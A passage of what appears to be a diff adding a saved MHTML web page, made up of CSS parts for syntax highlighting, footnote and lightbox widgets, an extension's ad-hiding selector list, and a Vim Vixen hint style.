+.highlight .gi { color: rgb(130, 174, 41); }
+
+.highlight .gd { color: rgb(198, 26, 88); }
+
+.highlight .ge { color: rgb(36, 38, 40); }
+
+.highlight .gr { color: rgb(198, 26, 88); }
+
+.highlight .gt { color: rgb(198, 26, 88); }
+
+.highlight .gh { color: rgb(57, 60, 62); }
+
+.highlight .go { color: rgb(57, 60, 62); }
+
+.highlight .gp { color: rgb(70, 170, 190); }
+
+.highlight .gu { color: rgb(68, 70, 72); }
+
+.highlight .k, .highlight .kv { color: rgb(70, 170, 190); }
+
+.highlight .kc { color: rgb(70, 170, 190); }
+
+.highlight .kd { color: rgb(70, 170, 190); }
+
+.highlight .kp { color: rgb(70, 170, 190); }
+
+.highlight .kr { color: rgb(70, 170, 190); }
+
+.highlight .kt { color: rgb(70, 170, 190); }
+
+.highlight .kn { color: rgb(198, 26, 88); }
+
+.highlight .ow { color: rgb(198, 26, 88); }
+
+.highlight .o { color: rgb(198, 26, 88); }
+
+.highlight .mf { color: rgb(127, 88, 203); }
+
+.highlight .mh { color: rgb(127, 88, 203); }
+
+.highlight .il { color: rgb(127, 88, 203); }
+
+.highlight .mi { color: rgb(127, 88, 203); }
+
+.highlight .mo { color: rgb(127, 88, 203); }
+
+.highlight .m, .highlight .mb, .highlight .mx { color: rgb(127, 88, 203); }
+
+.highlight .se { color: rgb(127, 88, 203); }
+
+.highlight .sb { color: rgb(168, 168, 98); }
+
+.highlight .sc { color: rgb(168, 168, 98); }
+
+.highlight .sd { color: rgb(168, 168, 98); }
+
+.highlight .s2 { color: rgb(168, 168, 98); }
+
+.highlight .sh { color: rgb(168, 168, 98); }
+
+.highlight .si { color: rgb(168, 168, 98); }
+
+.highlight .sx { color: rgb(168, 168, 98); }
+
+.highlight .sr { color: rgb(168, 168, 98); }
+
+.highlight .s1 { color: rgb(168, 168, 98); }
+
+.highlight .ss { color: rgb(168, 168, 98); }
+
+.highlight .s { color: rgb(168, 168, 98); }
+
+.highlight .na { color: rgb(130, 174, 41); }
+
+.highlight .nc { color: rgb(130, 174, 41); }
+
+.highlight .nd { color: rgb(130, 174, 41); }
+
+.highlight .ne { color: rgb(130, 174, 41); }
+
+.highlight .nf { color: rgb(130, 174, 41); }
+
+.highlight .no { color: rgb(70, 170, 190); }
+
+.highlight .bp { color: rgb(182, 180, 174); }
+
+.highlight .nb { color: rgb(182, 180, 174); }
+
+.highlight .ni { color: rgb(182, 180, 174); }
+
+.highlight .nn { color: rgb(182, 180, 174); }
+
+.highlight .vc { color: rgb(182, 180, 174); }
+
+.highlight .vg { color: rgb(182, 180, 174); }
+
+.highlight .vi { color: rgb(182, 180, 174); }
+
+.highlight .nv { color: rgb(182, 180, 174); }
+
+.highlight .w { color: rgb(182, 180, 174); }
+
+.highlight .nl { color: rgb(182, 180, 174); }
+
+.highlight .nt { color: rgb(198, 26, 88); }
+
+.highlight { color: rgb(182, 180, 174); background-color: rgb(36, 38, 40); }
+------MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: cid:css-72da7b8c-7294-4f65-b00a-ef0697f9b1ba@mhtml.blink
+
+@charset "utf-8";
+
+.bigfoot-footnote__button { border-color: initial; background-color: rgba(9=
+1, 91, 90, 0.2); text-decoration-color: initial; }
+
+.bigfoot-footnote__button:hover, .bigfoot-footnote__button:focus { outline-=
+color: initial; background-color: rgba(91, 91, 90, 0.5); }
+
+.bigfoot-footnote__button:active { background-color: rgba(91, 91, 90, 0.5);=
+ }
+
+.bigfoot-footnote__button.is-active { background-color: rgb(91, 91, 90); }
+
+.bigfoot-footnote { background-image: initial; background-color: rgb(185, 1=
+83, 178); border-color: rgb(151, 148, 141); box-shadow: rgba(19, 19, 19, 0.=
+3) 0px 0px 8px; }
+
+.bigfoot-footnote.is-scrollable::after { background-image: url("data:image/=
+svg+xml;base64,PHN2ZyB3aWR0aD0iMTJweCIgaGVpZ2h0PSIxNXB4IiB2aWV3Qm94PSIwIDAg=
+MTIgMTUiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB=
+4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgcHJlc2VydmVBc3BlY3=
+RSYXRpbz0ieE1pbllNaW4iPgogICAgPGcgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiI=
+GZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgPGcgaWQ9IkFycm93IiB0=
+cmFuc2Zvcm09InRyYW5zbGF0ZSgxLjAwMDAwMCwgMS4wMDAwMDApIiBzdHJva2U9ImJsYWNrIiB=
+zdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJzcXVhcmUiPgogICAgICAgICAgICA8cG=
+F0aCBkPSJNNSwwIEw1LDExLjUiIGlkPSJMaW5lIj48L3BhdGg+CiAgICAgICAgICAgIDxwYXRoI=
+GQ9Ik0wLjUsNy41IEw1LjAyNzY5Mjc5LDEyLjAyNzY5MjgiIGlkPSJMaW5lIj48L3BhdGg+CiAg=
+ICAgICAgICAgIDxwYXRoIGQ9Ik00LjUsNy41IEw5LjAyNzY5Mjc5LDEyLjAyNzY5MjgiIGlkPSJ=
+MaW5lLTIiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDcuMDAwMDAwLCAxMC4wMDAwMDApIHNjYWxlKC=
+0xLCAxKSB0cmFuc2xhdGUoLTcuMDAwMDAwLCAtMTAuMDAwMDAwKSAiPjwvcGF0aD4KICAgICAgI=
+CA8L2c+CiAgICA8L2c+Cjwvc3ZnPgo=3D"); }
+
+.bigfoot-footnote.is-scrollable .bigfoot-footnote__wrapper::before { backgr=
+ound-image: linear-gradient(rgb(185, 183, 178) 50%, rgba(185, 183, 178, 0) =
+100%); }
+
+.bigfoot-footnote.is-scrollable .bigfoot-footnote__wrapper::after { backgro=
+und-image: linear-gradient(to top, rgb(185, 183, 178) 50%, rgba(185, 183, 1=
+78, 0) 100%); }
+
+.bigfoot-footnote__wrapper { background-color: rgb(185, 183, 178); }
+
+.bigfoot-footnote__content { background-image: initial; background-color: r=
+gb(185, 183, 178); color: rgb(19, 19, 19); }
+
+.bigfoot-footnote__tooltip { background-image: initial; background-color: r=
+gb(185, 183, 178); border-color: rgb(151, 148, 141); box-shadow: rgba(19, 1=
+9, 19, 0.3) 0px 0px 8px; }
+
+.bigfoot-footnote__button::after { color: rgba(91, 91, 90, 0.5); }
+
+.bigfoot-footnote__button:hover::after, .bigfoot-footnote__button.is-active=
+::after { color: rgb(188, 186, 182); }
+------MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: cid:css-46a9a72b-5626-4d6b-999f-6589a318ca37@mhtml.blink
+
+@charset "utf-8";
+
+.fancybox-wrap, .fancybox-skin, .fancybox-outer, .fancybox-inner, .fancybox=
+-image, .fancybox-wrap iframe, .fancybox-wrap object, .fancybox-nav, .fancy=
+box-nav span, .fancybox-tmp { border-color: initial; outline-color: initial=
+; }
+
+.fancybox-skin { background-image: initial; background-color: rgb(185, 182,=
+ 177); color: rgb(61, 64, 65); text-shadow: none; }
+
+.fancybox-opened .fancybox-skin { box-shadow: rgba(19, 19, 19, 0.5) 0px 10p=
+x 25px; }
+
+.fancybox-error { color: rgb(61, 64, 65); }
+
+#fancybox-loading, .fancybox-close, .fancybox-prev span, .fancybox-next spa=
+n { background-image: url("https://www.ifmicro.com/assets/lib/fancybox/sour=
+ce/fancybox_sprite.png"); }
+
+#fancybox-loading div { background-image: url("https://www.ifmicro.com/asse=
+ts/lib/fancybox/source/fancybox_loading.gif"); background-color: initial; }
+
+.fancybox-nav { text-decoration-color: initial; background-image: url("http=
+s://www.ifmicro.com/assets/lib/fancybox/source/blank.gif"); background-colo=
+r: transparent; -webkit-tap-highlight-color: rgba(19, 19, 19, 0); }
+
+.fancybox-overlay { background-image: url("https://www.ifmicro.com/assets/l=
+ib/fancybox/source/fancybox_overlay.png"); background-color: initial; }
+
+.fancybox-title { text-shadow: none; }
+
+.fancybox-title-float-wrap .child { background-image: initial; background-c=
+olor: rgba(19, 19, 19, 0.8); text-shadow: rgb(39, 42, 44) 0px 1px 2px; colo=
+r: rgb(188, 186, 182); }
+
+.fancybox-title-outside-wrap { color: rgb(188, 186, 182); }
+
+.fancybox-title-over-wrap { color: rgb(188, 186, 182); background-image: in=
+itial; background-color: rgba(19, 19, 19, 0.8); }
+
+@media only screen and (-webkit-min-device-pixel-ratio: 1.5), not all, not =
+all {
+  #fancybox-loading, .fancybox-close, .fancybox-prev span, .fancybox-next s=
+pan { background-image: url("https://www.ifmicro.com/assets/lib/fancybox/so=
+urce/fancybox_sprite@2x.png"); }
+  #fancybox-loading div { background-image: url("https://www.ifmicro.com/as=
+sets/lib/fancybox/source/fancybox_loading@2x.gif"); }
+}
+------MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: cid:css-d85c7ec8-3c07-45d9-8b7e-b2904dd00bac@mhtml.blink
+
+@charset "utf-8";
+
+div.h5-ext-layer, div[adid], txpdiv[data-role=3D"hd-ad-adapter-interactivel=
+ayer"], div.m-video-play.js-play > a.m-video-bannerTitle.js-video-bannerTit=
+le, div#slide_ad, #Ad_windows, #Layeraa1, #Layeraa2, #MsnDialog.ad, #MyMove=
+Ad, #QQ_Full, #ZAML, #\31 280_adv, #aafoot.top_box, #aafoot[class^=3D"top_b=
+ox"], #aaheadtop, #aatop.top_box, #aatop[class^=3D"top_box"], #ad-SNSSplash=
+Ad, #ad08 { display: none !important; }
+
+#ad6cn, #adBody07, #adLeftFloat, #adRightFloat, #ad_box1, #ad_box2, #ad_ful=
+l, #ad_globle_div, #ad_headerbanner, #adrights14, #ads_c_tpc, #ads_in_video=
+, #ads_top_video, #adtop1, #adv-2, #adv-3, #adx_cggp, #body > #left-promoti=
+on, #body > #right-promotion, #bottomAD { display: none !important; }
+
+#bottombanner, #breadCrumb + .c + .t[style=3D"margin-top:8px"], #breadCrumb=
+ + .t[style=3D"margin-top:8px"], #comiis_xizi_gg02, #container > .sectionBa=
+nner, #crazy_ad_float, #crazy_ad_layer, #cs_left_couplet, #cs_right_couplet=
+, #dbgg, #duilian_left, #duilian_right, #eis_pad1, #eis_pad2, #everydayadv_=
+mask, #fk_faiVisitStateAd, #floatAd, #floatad-winpop, #footer_fix_ggw, #fra=
+meS8CyqB { display: none !important; }
+
+#fuo_top_float, #fwin_popad_7ree, #fwin_popad_7ree + #fwin_dialog, #gg1, #g=
+g300, #googleAD1, #googleAD2, #googleAD3, #googleAdIndexTop, #haoetv, #haoe=
+tv1, #haoxinqing_me_img, #js-ad-map, #js_ads_banner_top, #js_ads_banner_top=
+_slide, #kfivtwin, #kfpopupDiv, #ks > .DaKuang, #ldgindexbuttom, #leftCoupl=
+e { display: none !important; }
+
+#leftCouplet, #leftFloat + #rightFloat, #leftFloat[style=3D"z-index: 999; p=
+osition: fixed; left: 0px; bottom: 0px;"], #left_couple, #left_couplet.clos=
+e_discor, #left_down_float_ad, #left_float + #right_float, #left_float.clos=
+e_discor, #left_up_float_ad, #lovexin1, #lovexin11, #lovexin12, #lovexin121=
+, #lovexin13, #lovexin14, #lovexin2, #lt-ad-radio, #menu + #topBox, #menu +=
+ script + #topBox, #miaov_float_layer { display: none !important; }
+
+#micast_ads, #modalgg, #movieInfoRight, #mv_ad_dom, #mv_float_layer, #my-ad=
+sFPR, #nav + .slider-spons, #navcontainer + .moneyarea, #netease_mail_foote=
+r, #new_pop_ad, #news_top_advert, #olfullad, #overture_ads_bottom_td, #over=
+ture_ads_top_td, #photo--content-title-bottomx--foot, #photo-header-title-c=
+ontent-text-dallor, #piao_div_0[style*=3D"width:140px;"], #piao_div_1[style=
+*=3D"width:140px;"], #piao_div_2[style*=3D"width:140px;"], #piao_div_3[styl=
+e*=3D"width:140px;"] { display: none !important; }
+
+#piao_div_4[style*=3D"width:140px;"], #piao_div_5[style*=3D"width:140px;"],=
+ #player_banner[style*=3D"fixed;"], #popup.t, #pp-modal-id, #ptcmsad1, #qj9=
+60a, #qj960b, #reportPop, #results.content-main > .eLeft, #rightCouple, #ri=
+ghtCouple + #leftFloat, #rightCouplet, #rightCouplet + #leftFloat, #right_c=
+ouple, #right_couple + #left_float, #right_couplet.close_discor, #right_dow=
+n_float_ad, #right_float.close_discor, #right_up_float_ad { display: none !=
+important; }
+
+#search > a[href=3D"/top1.html"], #sitefocus.focus, #snActive-wrap, #sponso=
+rAdDiv2, #swtleft[style^=3D"position:fixed;"], #table1[width=3D"468"][heigh=
+t=3D"50"], #table1[width=3D"794"][height=3D"60"], #table1[width=3D"812"][he=
+ight=3D"50"], #table1[width=3D"812"][height=3D"60"], #tanx-con-1, #tanx-fol=
+d-main, #textggs, #top-gg-container, #top_ads0, #top_box > a[onclick^=3D"ja=
+vascript"], #toperAd2, #tr_ad1, #tr_ad10, #tr_ad11, #tr_ad2 { display: none=
+ !important; }
+
+#tr_ad3, #tr_ad4, #tr_ad5, #tr_ad6, #tr_ad7, #tr_ad8, #tr_ad9, #tripadvisor=
+-ad, #widget-quan, #wp > .V-videoFloat, #wrapper > .topad, #xianliaome_ads,=
+ #xinnxi, .Text-Advertising, ._cggp, ._ggs, ._popIn_recommend_article_ad, .=
+_popIn_recommend_article_ad_reserved, .a_cn, .a_fl { display: none !importa=
+nt; }
+
+.a_fr, .a_mu, .a_oscar1, .a_p, .a_pb, .a_pr, .a_pt, .a_ssk_cn, .a_sxc, .a_x=
+sfl, .aab-post, .aasd-text, .aasdwa, .ad-above-footer, .ad-below-adjacent-p=
+ost, .ad-below-header-menu, .ad-below-post-title, .ad-below-related-post, .=
+ad-couplet-common, .ad-left-down { display: none !important; }
+
+.ad-left-top, .ad-right-down, .ad-right-top, .ad-shine-panel, .ad-site, .ad=
+250left, .ad250right, .ad300left, .ad336left, .ad990x130, .ad990x90, .ad_co=
+uplebanner, .ad_fixed, .ad_footerbanner, .ad_headerbanner, .ad_hf, .ad_righ=
+t_1, .ad_right_2, .ad_thread, .ad_top_close + .bd { display: none !importan=
+t; }
+
+.adbox-bg.adscounter, .ads > a > img[src*=3D".sinaimg."], .ads_desktop, .ad=
+s_mobile, .adsense160, .adsense200, .adsoho, .advInfoElem, .afc_popup, .ann=
+iversary-wrap-2018, .artad, .asb-index, .asb-post, .assort-ad, .aub-post, .=
+baiduad, .banner-ad-section, .bdyp-sygg-ul, .below_ads, .bm.a_c { display: =
+none !important; }
+
+.bn728-100, .bn728-93, .bottomSponsor, .broadcastMe[style=3D"width: 1200px;=
+"], .btn.btn-default.hotwords[target=3D"_blank"], .bus_adsbox, .buyaoa-belo=
+w, .cari-ads, .chat-ad, .chat-right-ad, .chat-sysbroadcast-ad, .chat-top-ad=
+, .comiis_ad, .comiis_adbox, .comiis_guanggao, .comiis_guanggao_tit, .commo=
+n-topad, .common_ad, .con_ad, .con_search + #carousel-example-generic[style=
+^=3D"max-width: 1170px;"] { display: none !important; }
+
+.container > .ads, .content > a > .topline, .content-video > .ads, .content=
+-video > .ads-player, .content_ad_300, .corner-gg, .couplet_9cb0d, .ctm_ad,=
+ .customSlideshow-ad-below, .d_banner_inner, .dipiao, .edtj, .eis_muad, .er=
+ror > #qqs, .event_fullscreen_gg_modal, .f-sign-cont[data-dysign-adid], .fe=
+d-part-case > .ads-img, .ff-ads, .float-adv-left-bottom, .float-adv-left-to=
+p { display: none !important; }
+
+.float-adv-right-bottom, .float-adv-right-top, .floatAd, .float_bot_right, =
+.fnwehjnc12, .frAd, .full-ads, .full.banners12, .getads, .gg1000, .gg430, .=
+gg_300, .gg_728, .gg_950, .gg_960, .gg_full, .ggad, .ggbox, .gggpost-above,=
+ .ggpost-below { display: none !important; }
+
+.ggtop, .ggw, .global_video_bottom_dbtc, .google-ad2_fixed, .google_adsense=
+2, .gpost-below, .gpt_ads_box, .guangjiaodebupachuanxiede, .guruin-ads, .ha=
+o123-unionad-pic, .hbp > .wp_banner, .headxx11xiaoapp, .heg > .div-list, .h=
+is-sign-cont[data-dysign-adid], .hlol_ad, .hongbao_hd, .iHead960x90, .ibtad=
+, .index-top-ad, .index-top-gg { display: none !important; }
+
+.index-wz-ad, .index_alert_gg, .indexad2, .indexad3, .indexad4, .itopbar + =
+.container, .jav-nav + .bcpic, .jingqun_tu, .jq_mediav_ad_report, .jqrp_inf=
+oflow_ad, .kf_qycn_com_cckf_welcomebox, .leftadv, .listok > a > img[src*=3D=
+".alicdn.com"][width=3D"980"][height=3D"80"], .listok > a > img[style^=3D"w=
+idth:980px;height:"], .loc-home-top-adv-new, .lol-ad, .lol_ad, .lyzm-preven=
+t, .main-ad-l, .main-ad-r { display: none !important; }
+
+.main-ad-r + .topad, .main[style=3D"border:#7D8C8E solid 1px;height: 23px;"=
+], .maomi-content > .section-banner, .mediav-newsfeed-listitem-type-1, .med=
+iavAd_report, .mediavfeed-newsitem, .menutab_ad, .ml_ad1, .ml_ad3, .ml_ad5,=
+ .mlad, .mod + #bottomBox, .my-cat.my-cat-header, .mylist > a[target=3D"_ba=
+nk"] > img[src*=3D".alicdn.com/"], .mylist > a[target=3D"_bank"] > img[src*=
+=3D"kanjiantu."], .newstyle > .container > a[target=3D"_blank"], .overBanne=
+r.dowloadBtn, .pagead_3, .pagecon + .ad1, .pcgg { display: none !important;=
+ }
+
+.player + .sponsor, .player-bottom-gg, .pop[style=3D"right: 10px;"], .privi=
+lege-promote, .qq_nr_lad, .qzhfaaa, .readmidad, .right > .content > .ads, .=
+room-ad-bottom, .room-ad-top, .room-ad-video-down, .rtcenter_game, .scupioa=
+dslot, .spon-img[src*=3D".alicdn."], .subject_link[href$=3D"/thread-index-f=
+id-1-tid-12848.htm"], .sxAdBox, .t5[style=3D"border:1px solid #a6cbe7;"] + =
+.t[style=3D"margin-top:8px"], .table_ad, .textadlist, .theme_custom_slidebo=
+x-ad-below { display: none !important; }
+
+.tmall_ad_container, .tooltip > #tp, .top-read-ad, .topSponsor, .top_box > =
+#foot, .top_box > #indextop, .top_box > #news, .top_box > li > a[href^=3D"/=
+js/app.htm?"], .top_func_ad, .toy52_outer, .toy52apparel_ALL, .trad1, .trad=
+3, .twavt-ads, .wemziguanggao, .wf_ad_block, .widget-qianhuiji, .widget-top=
+adding, .widget-xlxba, .widget_adbox { display: none !important; }
+
+.widget_ui_ads, .widget_ui_asb, .widget_ui_aub, .widget_ui_textasb, .widget=
+_ui_textaub, .wordurl[style=3D"   width: 42%; float:left; text-align: cente=
+r;"], .wp > .ad-box, .wp.a_f, .wp.a_h, .wp.a_t, .wp_headline + .ad1, .wrap.=
+mt10.clearfix > .box.top_box, .wumii-bottom-popup, .wumii-widget-ad, .wzad,=
+ .xzbox-gh, .yd_ad, .yd_ad1, .yd_ad2, .yd_ad3 { display: none !important; }
+
+.yd_ad5, .yd_ad6, .zhedangceng_ggg, .zone_wap_banner2, a[href*=3D".com/?Age=
+nt=3D"], a[href=3D"http://t.cn/A6hQCVsv"], a[href^=3D"/e/public/ClickAd?adi=
+d=3D"], a > img[src*=3D".sinaimg."][src$=3D".gif"][style*=3D"width:960"], a=
+ > img[width=3D"960"][src*=3D".alicdn.com/"], a > img[width=3D"960"][src*=
+=3D".sinaimg."], a > img[width=3D"980"][src*=3D".sinaimg."], a#wrapper_left=
+_bg[target=3D"_blank"], a#wrapper_right_bg[target=3D"_blank"], a[href*=3D".=
+05bq.com/"], a[href*=3D".05cg.com/"], a[href*=3D".08an.com/"], a[href*=3D".=
+123ch.cn"], a[href*=3D".17yyba.com/"], a[href*=3D".222bz.com/"], a[href*=3D=
+".41gw.com/"] { display: none !important; }
+
+a[href*=3D".726188.com"], a[href*=3D".7wkw.com"], a[href*=3D".9xiazaiqi.com=
+"], a[href*=3D".acuxrecv.cn"], a[href*=3D".ahhxwavi.cn"], a[href*=3D".bayiy=
+y.com/download."], a[href*=3D".biwbmsyt.cn"], a[href*=3D".cangpie.com/"], a=
+[href*=3D".chouchuai.com/"], a[href*=3D".chuairan.com/"], a[href*=3D".com/?=
+Extend=3D"], a[href*=3D".com/?p=3D"][target=3D"_blank"] > img[src$=3D".gif"=
+], a[href*=3D".com/Register.aspx?aid=3D"], a[href*=3D".com/Register/?a=3D"]=
+, a[href*=3D".com?aff=3D"], a[href*=3D".com?intr=3D"], a[href*=3D".dajiang9=
+9.com"], a[href*=3D".dongtaisteel.com/"], a[href*=3D".downok.com"], a[href*=
+=3D".dpcpfw.com/"] { display: none !important; }
+
+a[href*=3D".gongnou.com/"], a[href*=3D".gsxzq.com/"], a[href*=3D".guzaosf.c=
+om/"], a[href*=3D".hbjimin.com/"], a[href*=3D".iziyo.com/"], a[href*=3D".li=
+aochuo.com/"], a[href*=3D".mieseng.com/"], a[href*=3D".qpokok.com/"], a[hre=
+f*=3D".qpzqxz.com/"], a[href*=3D".qtj5.com/"], a[href*=3D".quankan.tv"], a[=
+href*=3D".tbb168.com"], a[href*=3D".tduou.com/"], a[href*=3D".ttz5.cn"], a[=
+href*=3D".tudown.com/"], a[href*=3D".umeng.com"]:not([href=3D"http://www.um=
+eng.com/"]) > img, a[href*=3D".wenpie.com/"], a[href*=3D".wjLkj.com/"], a[h=
+ref*=3D".xlgqy.com/"], a[href*=3D".xrzzk.com/"] { display: none !important;=
+ }
+
+a[href*=3D".yb2843.vip"], a[href*=3D".yyk2.com/"], a[href*=3D"/602034.com"]=
+, a[href*=3D"/?INTR=3D"], a[href*=3D"/?Intr=3D"], a[href*=3D"/?intr=3D"], a=
+[href*=3D"/Register?a=3D"], a[href*=3D"/du505.com"], a[href*=3D"itoon.app"]=
+, a[href*=3D"nnqp.vip"], a[href*=3D"ywslxq.com"], a[href=3D"/e/member/regis=
+ter/index.php?tobind=3D0&groupid=3D1"], a[href=3D"/gghtml/tyc.html"], a[hre=
+f=3D"http://t.cn/E2PgiG1"], a[href=3D"http://t.cn/Ex0cCbt"], a[href=3D"http=
+://www.tw787.com/"], a[href=3D"http://www.yabovip5.cc/"], a[href^=3D"http:/=
+/172.247.157.176/"], a[href^=3D"http://ad.moemoe."], a[href^=3D"http://go.g=
+otourl.xyz/"] { display: none !important; }
+
+a[href^=3D"http://pic.gunqiu.com/"], a[href^=3D"http://www.upupoo.com"], a[=
+href^=3D"https://hi.potvpn.com/?from=3D"], a[href^=3D"https://luolidao.vip/=
+"], a[onclick^=3D"javascript:pc_"] > img[src*=3D".alicdn.com"], a[style=3D"=
+display:inline-block;font-weight:bold;color:#f00;border:1px solid #f00;bord=
+er-radius:15px;padding:2px 5px 2px 5px;margin:5px 5px 5px 0px;"], body .has=
+-ad, body[class|=3D"view"] > .ad-box, body[onload*=3D"u()"] > #x, center > =
+a[target=3D"_blank"] > img[style=3D"padding- bottom:5px;width:960px;height:=
+120px;"], center > a[target=3D"_blank"] > img[style=3D"padding- bottom:5px;=
+width:960px;height:60px;"], div#ad_id, div#xinxi, div[class^=3D"ADTOPLB_"],=
+ div[id^=3D"ad_thread"], form + .div-search-box.col-lg-offset-2.col-lg-8 > =
+a[target=3D"_blank"], img[data-link][data-src*=3D"/u/"]:not([data-link*=3D"=
+/i/"]), img[data-src*=3D".alicdn.com/img/ibank/"][src=3D"/static/images/loa=
+dingerror.gif"], img[src$=3D"/img/tianbo.gif"], img[src*=3D".qpic.cn"][widt=
+h=3D"980"][height=3D"80"] { display: none !important; }
+
+img[src*=3D".sinaimg."][style=3D"width:1025px;height:80px"], img[src*=3D".s=
+inaimg."][style=3D"width:150px;height:300px"], script + #coupletBox, script=
+ + #rbbox, script[src=3D"/js/sy2.js"] + div[align=3D"center"], span[title=
+=3D"neteasefooter"], table[style=3D"border:#7D8C8E solid 1px;height: 30px;t=
+ext-align: center;"], [style=3D"display:none"] + iframe[scrolling=3D"no"][s=
+rc*=3D"//"][src*=3D"?"][src*=3D"=3D"][src*=3D"&"][width][height][frameborde=
+r=3D"0"], div:not(#video)[style^=3D"width: 100%;"][style$=3D"display: block=
+;"] iframe[scrolling=3D"no"][src*=3D"//"][src*=3D"?"][src*=3D"=3D"][src*=3D=
+"&"][width][height][frameborder=3D"0"], div:not([id]):not([class]):not([sty=
+le]) > div:not([id]):not([class]):not([style]) > iframe[scrolling=3D"no"][s=
+rc*=3D"//"][src*=3D"?"][src*=3D"=3D"][src*=3D"&"][width][height][frameborde=
+r=3D"0"]:not([src^=3D"http://www.facebook.com/"]), div[style^=3D"width: 100=
+%;"][style$=3D"margin: 0px;"] iframe[scrolling=3D"no"][src*=3D"//"][src*=3D=
+"?"][src*=3D"=3D"][src*=3D"&"][width][height][frameborder=3D"0"], div[style=
+^=3D"width: 100%;"][style$=3D"opacity: 100;"] iframe[scrolling=3D"no"][src*=
+=3D"//"][src*=3D"?"][src*=3D"=3D"][src*=3D"&"][width][height][frameborder=
+=3D"0"], div[style^=3D"width: 100%;"][style$=3D"overflow: hidden;"] iframe[=
+scrolling=3D"no"][src*=3D"//"][src*=3D"?"][src*=3D"=3D"][src*=3D"&"][width]=
+[height][frameborder=3D"0"], div[style^=3D"width: 100%;"][style$=3D"visibil=
+ity: visible;"] iframe[scrolling=3D"no"][src*=3D"//"][src*=3D"?"][src*=3D"=
+=3D"][src*=3D"&"][width][height][frameborder=3D"0"], div[style^=3D"width: 1=
+00%;"][style$=3D"z-index: inherit;"] iframe[scrolling=3D"no"][src*=3D"//"][=
+src*=3D"?"][src*=3D"=3D"][src*=3D"&"][width][height][frameborder=3D"0"], a[=
+href*=3D"/cpro."], a[href*=3D"/cpro/"], #bd-hl-content, #container > #pic_c=
+ontainer, #container > .item.title_normal { display: none !important; }
+
+#container > .item.title_top, #container > .wrapper > .fl, #container > a.b=
+lock, #container.container > a.item, #cpro_container, #img-txt-wrapper > #t=
+itle_desc_div, #wrapper > div[style=3D"padding:3px;"] > #pic, .container > =
+.pic_container, .container > a.mid-wrapper, a[href*=3D"/mobads.php?"], div[=
+id][style=3D"width: 100%;"] > div > div > iframe[scrolling=3D"no"][src^=3D"=
+http"][src*=3D"?"][src*=3D"=3D"][src*=3D"&"][width][height][frameborder=3D"=
+0"], div[id][style=3D"width: 100%;"] > div > iframe[scrolling=3D"no"][src^=
+=3D"http"][src*=3D"?"][src*=3D"=3D"][src*=3D"&"][width][height][frameborder=
+=3D"0"], div[id][style=3D"width: 100%;"] > iframe[scrolling=3D"no"][src^=3D=
+"http"][src*=3D"?"][src*=3D"=3D"][src*=3D"&"][width][height][frameborder=3D=
+"0"], div[id^=3D"_"] > iframe[scrolling=3D"no"][src^=3D"http"][width][heigh=
+t][frameborder=3D"0"], div[style=3D"width: 100%;"]:not([id]):not([class]) >=
+ iframe[scrolling=3D"no"][src*=3D"//"][src*=3D"?"][src*=3D"=3D"][src*=3D"&"=
+][width][height][frameborder=3D"0"], div[style^=3D"width: 100%;"]:not([id])=
+:not([class]) > iframe[scrolling=3D"no"][src^=3D"http"][src*=3D"?"][src*=3D=
+"=3D"][src*=3D"&"][width][height][frameborder=3D"0"]:not([allowfullscreen])=
+, .footer > #box[style=3D"width:100%;height:100%;position:fixed;top:0"], a[=
+href*=3D".gotourls.bid"], a[href^=3D"http://yunbofangbt."], div[align=3D"ce=
+nter"] > a[href^=3D"/url/"] > img[src*=3D".alicdn.com"] { display: none !im=
+portant; }
+
+div[align=3D"center"] > a[href^=3D"/url/"] > img[src*=3D".qpic.cn"], #downd=
+iv > .downcode, .readerListADbox, a[href*=3D"://mgzs.cdn.bcebos.com/"], a[h=
+ref^=3D"https://uds24.com/"], #asx_text, #wp > .V-video-floats, .b_oscar1, =
+.b_pr, .b_sxc, .b_sxp, .float-left12 > .div-list, a[onclick*=3D"/dasp.php?a=
+=3D"], #j-new-ad, .a_sxfl, .a_sxmu, .a_sxp, .a_sxpb, .heg > .partner-list, =
+a[href^=3D"/dasp.php?a=3D"] { display: none !important; }
+
+#toptb + div[align=3D"center"], .it618_firstad_flex, table[style=3D"border:=
+#e8e8e8 1px solid;"] + div[style=3D"margin-top:5px"] > table[style=3D"width=
+:100%;"][cellspacing=3D"0"][cellpadding=3D"1"][bordercolor=3D"#22222"][bord=
+er=3D"1"] { display: none !important; }
+------MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: cid:css-235e321a-7b37-476b-922b-eb72314b385b@mhtml.blink
+
+@charset "utf-8";
+=0A
+------MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: cid:css-069d3e07-62f7-4602-9839-7577c8013248@mhtml.blink
+
+@charset "utf-8";
+
+.vimvixen-hint { background-color: rgb(203, 174, 99) !important; border-col=
+or: rgb(161, 133, 19) !important; color: rgb(54, 46, 23) !important; }
+
+::placeholder { opacity: 0.5 !important; }
+------MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: cid:css-600b600d-5735-46b4-aa5b-63e7776197c1@mhtml.blink
+
+@charset "utf-8";
+
+.fancybox-margin { margin-right: 17px; }
+------MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
